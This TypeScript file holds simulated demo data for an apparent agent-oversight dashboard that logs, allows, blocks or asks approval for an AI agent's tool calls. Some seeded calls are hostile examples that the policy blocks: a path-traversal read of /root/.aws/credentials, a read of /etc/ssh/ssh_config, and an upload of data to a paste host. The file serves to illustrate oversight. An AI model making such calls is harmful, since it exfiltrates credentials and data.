// All data here is SIMULATED demo data. No backend, agent, or stream exists.
export type Decision = 'allow' | 'ask' | 'block'
export type Risk = 'low' | 'medium' | 'high'
export type ProfileId = 'coding' | 'general' | 'daily'
export type SessionState = 'ACTIVE' | 'PAUSED' | 'ENDED' | 'AWAITING'

export interface ToolCall {
  seq: number
  ts: string
  tool: string
  args: Record<string, string>
  decision: Decision
  status: 'done' | 'pending' | 'denied' | 'blocked' | 'approved'
  reason: string
  latencyMs: number | null
  risk: Risk
  reversible: boolean
}

export interface Session {
  id: string
  title: string
  profile: ProfileId
  state: SessionState
  startedAt: string
  budget: { used: number; limit: number }
  calls: ToolCall[]
}

export const PROFILES: Record<ProfileId, { name: string; desc: string; tools: string[]; demo?: boolean }> = {
  coding: {
    name: 'Coding',
    desc: 'Repo workspace, shell, tests, git.',
    tools: ['fs.read', 'fs.write', 'shell.exec', 'git.commit', 'files.upload'],
  },
  general: {
    name: 'General',
    desc: 'Browser research and notes.',
    tools: ['browser.open', 'browser.read', 'fs.write', 'http.fetch'],
  },
  daily: {
    name: 'Daily routine',
    desc: 'Calendar and mail digests via Google connector.',
    tools: ['gmail.list', 'calendar.read', 'fs.write'],
    demo: true,
  },
}

export const REASONS: Record<string, string> = {
  POLICY_ALLOW: 'Tool and arguments are within profile policy.',
  WORKSPACE_SCOPE: 'Path is inside /workspace jail.',
  PATH_JAIL: 'Path resolves outside the session workspace.',
  EGRESS_DENIED: 'Destination host is not on the egress allowlist.',
  EXTERNAL_TRANSFER: 'Data leaves the sandbox; user approval required.',
  USER_APPROVED: 'Approved by user from mobile.',
  USER_DENIED: 'Denied by user from mobile.',
  APPROVAL_EXPIRED: 'Approval window elapsed; treated as deny.',
}

const BASE = Date.parse('2026-11-26T09:30:00Z')
const t = (m: number) => new Date(BASE - m * 60000).toISOString()

export const seedSessions = (): Session[] => [
  {
    id: 'ses_7f3a',
    title: 'Fix flaky auth tests in api-server',
    profile: 'coding',
    state: 'AWAITING',
    startedAt: t(14),
    budget: { used: 0.42, limit: 2 },
    calls: [
      { seq: 1, ts: t(13), tool: 'fs.read', args: { path: '/workspace/api-server/package.json' }, decision: 'allow', status: 'done', reason: 'WORKSPACE_SCOPE', latencyMs: 12, risk: 'low', reversible: true },
      { seq: 2, ts: t(12), tool: 'shell.exec', args: { cmd: 'npm test -- auth.spec.ts' }, decision: 'allow', status: 'done', reason: 'POLICY_ALLOW', latencyMs: 8420, risk: 'medium', reversible: true },
      { seq: 3, ts: t(10), tool: 'fs.read', args: { path: '/workspace/api-server/src/auth/session.ts' }, decision: 'allow', status: 'done', reason: 'WORKSPACE_SCOPE', latencyMs: 9, risk: 'low', reversible: true },
      { seq: 4, ts: t(9), tool: 'fs.read', args: { path: '/etc/ssh/ssh_config' }, decision: 'block', status: 'blocked', reason: 'PATH_JAIL', latencyMs: 3, risk: 'high', reversible: true },
      { seq: 5, ts: t(7), tool: 'fs.write', args: { path: '/workspace/api-server/src/auth/session.ts', diff: '+12 −4 lines' }, decision: 'allow', status: 'done', reason: 'WORKSPACE_SCOPE', latencyMs: 21, risk: 'medium', reversible: true },
      { seq: 6, ts: t(5), tool: 'shell.exec', args: { cmd: 'npm test' }, decision: 'allow', status: 'done', reason: 'POLICY_ALLOW', latencyMs: 14210, risk: 'medium', reversible: true },
      { seq: 7, ts: t(3), tool: 'http.fetch', args: { url: 'https://paste.example.net/upload', body: '[redacted 2.1 KB]' }, decision: 'block', status: 'blocked', reason: 'EGRESS_DENIED', latencyMs: 4, risk: 'high', reversible: true },
      { seq: 8, ts: t(1), tool: 'files.upload', args: { file: '/workspace/api-server/test-report.html', dest: 'drive://Shared/QA', token: '[redacted]' }, decision: 'ask', status: 'pending', reason: 'EXTERNAL_TRANSFER', latencyMs: null, risk: 'high', reversible: false },
    ],
  },
  {
    id: 'ses_51c2',
    title: 'Summarize MCP spec changes',
    profile: 'general',
    state: 'PAUSED',
    startedAt: t(95),
    budget: { used: 0.88, limit: 1 },
    calls: [
      { seq: 1, ts: t(94), tool: 'browser.open', args: { url: 'https://modelcontextprotocol.io/changelog' }, decision: 'allow', status: 'done', reason: 'POLICY_ALLOW', latencyMs: 1320, risk: 'low', reversible: true },
      { seq: 2, ts: t(90), tool: 'fs.write', args: { path: '/workspace/notes/mcp-changes.md' }, decision: 'allow', status: 'done', reason: 'WORKSPACE_SCOPE', latencyMs: 15, risk: 'low', reversible: true },
    ],
  },
  {
    id: 'ses_0b9e',
    title: 'Morning digest',
    profile: 'daily',
    state: 'ENDED',
    startedAt: t(60 * 20),
    budget: { used: 0.12, limit: 0.5 },
    calls: [
      { seq: 1, ts: t(60 * 20), tool: 'gmail.list', args: { query: 'is:unread newer_than:1d' }, decision: 'allow', status: 'done', reason: 'POLICY_ALLOW', latencyMs: 640, risk: 'low', reversible: true },
    ],
  },
]

export const DEMO_EVENTS: Omit<ToolCall, 'seq' | 'ts'>[] = [
  { tool: 'fs.read', args: { path: '/workspace/api-server/src/auth/token.ts' }, decision: 'allow', status: 'done', reason: 'WORKSPACE_SCOPE', latencyMs: 11, risk: 'low', reversible: true },
  { tool: 'shell.exec', args: { cmd: 'npx eslint src/auth' }, decision: 'allow', status: 'done', reason: 'POLICY_ALLOW', latencyMs: 3120, risk: 'medium', reversible: true },
  { tool: 'fs.read', args: { path: '/workspace/../root/.aws/credentials' }, decision: 'block', status: 'blocked', reason: 'PATH_JAIL', latencyMs: 2, risk: 'high', reversible: true },
  { tool: 'git.commit', args: { message: 'fix(auth): await session refresh before assert' }, decision: 'allow', status: 'done', reason: 'POLICY_ALLOW', latencyMs: 88, risk: 'medium', reversible: true },
  { tool: 'http.fetch', args: { url: 'https://registry.unknown-mirror.io/pkg' }, decision: 'block', status: 'blocked', reason: 'EGRESS_DENIED', latencyMs: 3, risk: 'high', reversible: true },
]

export const PLAN_STEPS = [
  { tool: 'fs.read', desc: 'Read failing test and auth module', risk: 'low' as Risk, reversible: true },
  { tool: 'shell.exec', desc: 'Run auth test suite to reproduce', risk: 'medium' as Risk, reversible: true },
  { tool: 'fs.write', desc: 'Patch session refresh race', risk: 'medium' as Risk, reversible: true },
  { tool: 'shell.exec', desc: 'Re-run full test suite', risk: 'medium' as Risk, reversible: true },
  { tool: 'git.commit', desc: 'Commit fix on agent branch', risk: 'medium' as Risk, reversible: true },
  { tool: 'files.upload', desc: 'Upload test report to shared drive', risk: 'high' as Risk, reversible: false },
]

// Mock-only: NOT a cryptographic hash. Used to illustrate chain linkage in the UI.
export function mockHash(s: string) {
  let h = 2166136261
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i)
    h = Math.imul(h, 16777619)
  }
  return (h >>> 0).toString(16).padStart(8, '0')
}
